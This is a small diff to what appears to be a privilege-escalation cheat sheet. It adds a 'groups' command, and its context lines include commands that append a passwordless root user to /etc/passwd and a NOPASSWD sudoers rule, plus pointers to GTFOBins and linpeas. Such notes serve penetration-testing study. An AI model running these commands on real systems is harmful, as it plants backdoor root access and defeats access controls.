@@ -8,6 +8,7 @@
 - `sudo -V` to check sudo version, which might be vulnerable.<br>
 - `echo "vickie::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd`<br>
 - `echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoer`<br>
+- 'groups`<br>
 
 https://gtfobins.github.io/<br>
 linpeas.sh<br>
